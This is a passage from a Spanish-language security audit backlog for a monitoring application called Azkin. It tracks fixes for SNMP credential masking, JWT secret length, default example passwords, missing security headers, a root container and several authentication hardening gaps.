`maskSecret()` ya existente de `notification-secrets.ts` (constante hermana nueva,
`SENSITIVE_MONITOR_FIELDS` en `monitor-secrets.ts`). `UpdateMonitorUseCase` enmascara esos mismos
campos en el diff que escribe en `metadata.changes` del audit log, sin tocar `diffFields` (sigue
genérico). Cubierto con tests nuevos (`monitor.presenter.test.ts`,
`update-monitor.usecase.test.ts`).

### Descripcion

Los canales de notificacion tienen un pipeline explicito de enmascarado
(`SENSITIVE_NOTIFICATION_CONFIG_KEYS`/`maskSecret`) antes de devolverse al cliente o escribirse en
el diff del log de auditoria. Las credenciales SNMP de un monitor (`snmpCommunity`,
`snmpV3AuthKey`, `snmpV3PrivKey`) no tienen equivalente: `toMonitorResponse`
(`backend/src/infrastructure/http/presenters/monitor.presenter.ts:42-50`) las devuelve en texto
plano en cada `GET /monitors`, incluso a un Viewer acotado a ese monitor especifico; y
`UpdateMonitorUseCase` (`backend/src/application/use-cases/monitors/update-monitor.usecase.ts:37-43`)
escribe el valor viejo y nuevo de esas claves, sin enmascarar, directo en `metadata.changes` del
audit log — que cualquier Admin puede leer via `GET /api/v1/audit-log`, sin relacion con si tiene
permiso sobre ese monitor.

### Comportamiento esperado

Las credenciales SNMP se enmascaran en las respuestas de API (salvo al propio formulario de edicion,
igual que notificaciones) y en el log de auditoria, con el mismo criterio que ya existe para
secretos de canales de notificacion.

### Criterios de aceptacion

1. `toMonitorResponse` enmascara `snmpCommunity`/`snmpV3AuthKey`/`snmpV3PrivKey` salvo en el
   contexto de edicion del propio monitor por un Admin.
2. `diffFields` para el audit log de monitores enmascara esos mismos campos antes de persistir el
   diff.

### Pistas de investigacion

- `backend/src/infrastructure/http/presenters/monitor.presenter.ts:42-50`
- `backend/src/application/use-cases/monitors/update-monitor.usecase.ts:37-43`
- `backend/src/application/services/notification-secrets.ts` (patron ya existente para copiar).

---

## AZ-063) `AZKIN_JWT_SECRET` sin longitud minima — de el se deriva ademas la clave de cifrado en reposo de TLS/federacion

- Codigo: AZ-063
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`env.ts`: `AZKIN_JWT_SECRET` pasó de `.min(1)` a `.min(32, ...)` con mensaje claro sugiriendo
`openssl rand -hex 32`. Ambos `.env.example` (raíz y `backend/`) se revisaron/actualizaron para
seguir cumpliendo el nuevo mínimo (el de `backend/.env.example` era de 24 caracteres y se
reemplazó por un placeholder más largo).

### Descripcion

`backend/src/infrastructure/config/env.ts:17` — `AZKIN_JWT_SECRET: z.string().min(1, ...)` acepta
un secreto de 1 caracter. Cuando `AZKIN_TLS_ENCRYPTION_KEY` no esta configurada (el default
documentado y alentado), `resolve-tls-encryption-key.ts:23-26` deriva la clave AES-256-GCM que
cifra en reposo las claves privadas TLS y los secretos compartidos de federacion via HKDF-SHA256
**a partir de este mismo secreto**. La derivacion HKDF en si es solida (verificado: salt vacio
correcto para IKM con suficiente entropia, info string fija para separacion de dominio, sin reuso),
pero su seguridad depende enteramente de la entropia de `AZKIN_JWT_SECRET` — un secreto corto/débil
permite tanto forjar JWT de Admin como, con el mismo dato, recalcular la clave de cifrado y
descifrar cualquier clave TLS o secreto de federacion exfiltrado.

### Comportamiento esperado

`AZKIN_JWT_SECRET` exige una longitud minima razonable (ej. 32 caracteres) al arrancar.

### Criterios de aceptacion

1. El schema Zod de `env.ts` exige `min(32)` (o equivalente en bits de entropia) para
   `AZKIN_JWT_SECRET`, con un mensaje de error claro si no se cumple.

### Pistas de investigacion

- `backend/src/infrastructure/config/env.ts:17`
- `backend/src/infrastructure/config/resolve-tls-encryption-key.ts:23-26` (consumidor de este
  secreto para la derivacion).

---

## AZ-064) Credenciales por defecto en `.env.example` parecen contraseñas reales, no placeholders obvios, y no hay verificacion al arrancar

- Codigo: AZ-064
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Baja
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`env.ts` compara al arrancar `AZKIN_MONGO_PASSWORD` (vía `AZKIN_MONGO_URI`, la única forma en que
el backend la recibe), `AZKIN_FIRST_ADMIN_PASSWORD` y `AZKIN_PROMETHEUS_PASS` contra los 3 valores
literales exactos de `.env.example`; si alguno coincide, emite un bloque de `console.warn` bien
visible listando cuáles. Un solo punto de choque (mismo archivo que ya centraliza el warning de
CORS/Prometheus/bcrypt), en vez de duplicar la comparación en `seed-first-admin.ts`.

### Descripcion

`.env.example`: `AZKIN_MONGO_PASSWORD=CambiarEstaContrasenaDeMongoSegura123!`,
`AZKIN_FIRST_ADMIN_PASSWORD=CambiarEstaContrasenaSegura123!`,
`AZKIN_PROMETHEUS_PASS=PrometheusScraperSecurePass123!` — con forma de contraseña real (no un
placeholder que obviamente falle, como `CHANGE_ME`). `seed-first-admin.ts` siembra el primer Admin
con lo que sea que tenga `AZKIN_FIRST_ADMIN_PASSWORD` sin comparar contra el valor de ejemplo
conocido ni forzar cambio en el primer login. Un operador que copia `.env.example` → `.env` para
"probar rapido" y se olvida de cambiar estos tres valores termina con credenciales adivinables por
cualquiera que haya visto este repo publico.

### Comportamiento esperado

El primer arranque advierte fuerte (o rechaza arrancar) si alguna de estas credenciales sigue siendo
exactamente el valor de ejemplo del repo.

### Criterios de aceptacion

1. `seed-first-admin.ts` (u otro punto de arranque) compara el hash de las credenciales configuradas
   contra los valores conocidos de `.env.example` y emite una advertencia persistente y visible si
   coinciden.

### Pistas de investigacion

- `.env.example`, `backend/.env.example`
- `backend/src/infrastructure/config/seed-first-admin.ts`

---

## AZ-065) Sin cabeceras de seguridad (helmet) en el dashboard de administracion; el contenedor backend corre como root

- Codigo: AZ-065
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Baja
- Reportado: 2026-07-24

### Progreso (2026-07-27)

(1) `composition-root.ts` monta `helmet()` con CSP `default-src 'none'`/`frameAncestors 'none'`
antes de las rutas (el backend solo sirve JSON, así que una CSP restrictiva no rompe nada).
`frontend/nginx.conf` agrega `X-Frame-Options DENY`, `X-Content-Type-Options nosniff`,
`Referrer-Policy` y `Content-Security-Policy: frame-ancestors 'none'` a nivel de `server {}`
(heredado por todas las `location`). (2) `backend/Dockerfile` (etapa runtime) ahora corre como el
usuario `node` (uid 1000) ya incluido en `node:24-alpine`, no como root; `compose.yaml`/
`compose.dev.yaml` agregan `cap_add: [NET_RAW]` al servicio `backend` para que el checker de Ping
siga abriendo su socket ICMP. **Verificado con Docker real, no solo lectura de código:** se
construyó la imagen (`docker build`) y se confirmó en un contenedor de prueba que el proceso corre
como `node` (`whoami`/`id`) y que un `ping` real hacia una IP pública funciona correctamente con
`--cap-add=NET_RAW`.

### Descripcion

`backend/src/composition-root.ts:214-224` monta `cors`/`express.json`/`cookie-parser`/
`licenseNotice` pero nunca `helmet()` ni cabeceras manuales — sin `X-Frame-Options`/
`frame-ancestors`, sin `X-Content-Type-Options: nosniff`, sin CSP, sin HSTS. `frontend/nginx.conf`
tampoco agrega estas cabeceras. El dashboard de Azkin ejecuta acciones destructivas/de estado
(borrar monitores, purgar la instancia, revocar API keys) — sin `X-Frame-Options`/`frame-ancestors`
es plausible un intento de clickjacking contra un Admin autenticado.

Por separado: `backend/Dockerfile` (etapa de runtime) no define un `USER` no-root, asi que el
proceso Node corre como root dentro del contenedor — el radio de impacto de cualquier RCE futura en
el proceso queda ampliado innecesariamente.

### Comportamiento esperado

1. El backend agrega cabeceras de seguridad basicas (`helmet()` con `frame-ancestors 'none'`,
   `nosniff`, CSP base, HSTS cuando corre HTTPS nativo).
2. El contenedor backend corre como un usuario sin privilegios.

### Criterios de aceptacion

1. `composition-root.ts` monta `helmet()` (o equivalente manual) antes de las rutas.
2. `backend/Dockerfile` define `USER` no-root antes del `CMD` de la etapa de runtime (usando
   `cap_add: [NET_RAW]` en compose si el checker de ping lo necesita, en vez de correr todo como
   root).

### Pistas de investigacion

- `backend/src/composition-root.ts:214-224`
- `backend/Dockerfile`
- `frontend/nginx.conf`

---

## AZ-066) Miscelanea de hardening de autenticacion (rate limit compartido, sin bloqueo por intentos fallidos, politica de contraseña debil, y otros gaps menores)

- Codigo: AZ-066
- Estado: [~] Mayormente resuelto (2026-07-27) — 7 de 8 items resueltos, item 2 diferido
- Prioridad: Baja
- Reportado: 2026-07-24

### Progreso (2026-07-27)

1. **Rate limit compartido — resuelto.** `auth.routes.ts` usa ahora una instancia propia de
   `makeAuthRateLimiter(10, 15)` por endpoint (`/register`, `/login`, `/forgot-password`,
   `/reset-password`), y se agregó una nueva (`30, 15`) para `/refresh`, que antes no tenía
   ningún límite.
2. **Bloqueo de cuenta por intentos fallidos — deliberadamente diferido.** Es una feature nueva
   (contador por cuenta, política de desbloqueo, posible UI de Admin para desbloquear
   manualmente, interacción con el `isBlocked` manual ya existente) que amerita su propio diseño,
   no un fix de una línea. El rate limiter por IP (item 1 + AZ-055) ya cubre el caso de mayor
   impacto que el propio issue pedía priorizar ("Priorizar 1-2 sobre el resto").
3. **Política de contraseña — resuelto.** Nuevo `password-policy.ts`
   (`isPasswordStrong`/`PASSWORD_POLICY_MESSAGE`, mínimo 8 + al menos una letra y un número),
   reusado en `auth.schema.ts` (`registerSchema`/`resetPasswordSchema`) y en los 3 checks inline de
   `user.controller.ts` — una sola política en todo el sistema, no 4 implementaciones distintas.
4. **Warning por `AZKIN_BCRYPT_COST` bajo — resuelto.** `env.ts` advierte si es menor a 10.
5. **`algorithms` explícito en JWT — resuelto** (junto con AZ-054): `sign()`/`verify()` en
   `jwt-token-service.ts` fijan `algorithm`/`algorithms: ["HS256"]` explícitamente.
6. **HTTPS no exigido en federación — resuelto (con advertencia, no bloqueo).** No se bloquea
   `http://` (AZ-049 slice 3 documenta que la federación soporta HTTP plano deliberadamente).
   `SetFederationOwnUrlUseCase` ahora loguea un warning si la URL propia normalizada es `http://`
   fuera de localhost/puertos de desarrollo — el secreto compartido viajaría sin cifrar. No se
   propagó el mismo aviso al lado que acepta una URL de par ajena durante el enrollment (tocaría
   más superficie del flujo por un hallazgo de prioridad Baja).
7. **Inyección de Markdown en Telegram — resuelto.** `renderTemplate()` ganó un `escapeValue`
   opcional; `sendTelegram()` lo usa para escapar `_ * \` [` en cada valor sustituido, sin tocar el
   texto fijo de la plantilla.
8. **Fallback de Socket.IO por query string — resuelto.** Se eliminó la rama `fromQuery` de
   `extractToken()` en `socketio.gateway.ts` (confirmado que el frontend nunca la usaba).

### Descripcion

Items menores/de endurecimiento encontrados en la misma auditoria, agrupados por ser de bajo impacto
individual pero faciles de corregir juntos:

1. **Rate limit compartido entre 4 endpoints.** `const strictLimiter = makeAuthRateLimiter(10, 15)`
   (`auth.routes.ts:12-17`) es una unica instancia reusada para `/register`, `/login`,
   `/forgot-password` y `/reset-password` — los 4 comparten el mismo cupo de 10 requests/15min por
   IP, asi que agotar el cupo en uno bloquea a los demas para esa IP.
2. **Sin bloqueo de cuenta por intentos fallidos.** La unica proteccion contra fuerza bruta es el
   rate limiter por IP (ver AZ-055) — no hay contador de intentos fallidos por cuenta ni bloqueo
   progresivo.
3. **Politica de contraseña minima.** Solo `min(8)`, sin exigir complejidad
   (`auth.schema.ts:9,21`).
4. **`AZKIN_BCRYPT_COST` permite bajar hasta 4** (`env.ts:31`) sin ninguna advertencia si un
   operador lo configura bajo en produccion, a diferencia del aviso que ya existe para CORS.
5. **`jwt.verify()` no fija `algorithms` explicitamente** (`jwt-token-service.ts:25`) — no es
   explotable hoy (el secreto es un string plano, `jsonwebtoken` ya restringe a HMAC), pero es
   defensa en profundidad barata ante un futuro refactor.
6. **Federacion/URL propia sin exigir HTTPS.** `federation.schema.ts` y `normalize-instance-url.ts`
   aceptan `http://` sin advertencia — el secreto compartido de federacion viaja en el header
   `X-Federation-Secret` sin cifrado si el operador configura una URL de par en `http://`.
7. **Inyeccion de Markdown en Telegram.** `multichannel-notifier.ts:111-133` manda el nombre de
   monitor con `parse_mode: "Markdown"` sin escapar — un nombre con `_`/`*`/`[texto](url)` puede
   romper el formato o mostrar un link falso dentro de la alerta.
8. **Fallback de Socket.IO por query string, sin usar hoy.** `socketio.gateway.ts:71-72` acepta el
   JWT via `?token=` ademas del handshake `auth:{token}` — el cliente Angular no lo usa
   (`realtime.service.ts` solo usa `auth:{token}`), pero de usarse algun dia el token quedaria en
   logs de acceso/historial del navegador (mismo riesgo que `metrics-auth.ts` ya evita a proposito).

### Comportamiento esperado / Criterios de aceptacion

Cada item de la lista se corrige de forma independiente segun su propia descripcion — no hay un
criterio unico. Priorizar 1-2 (impacto en brute-force) sobre el resto.

### Pistas de investigacion

- `backend/src/infrastructure/http/routes/auth.routes.ts:12-17`
- `backend/src/infrastructure/http/schemas/auth.schema.ts`
- `backend/src/infrastructure/config/env.ts:31`
- `backend/src/infrastructure/security/jwt-token-service.ts:25`
- `backend/src/infrastructure/http/schemas/federation.schema.ts`,
  `backend/src/application/services/normalize-instance-url.ts`
- `backend/src/infrastructure/notifier/multichannel-notifier.ts:111-133`
- `backend/src/infrastructure/realtime/socketio.gateway.ts:71-72`
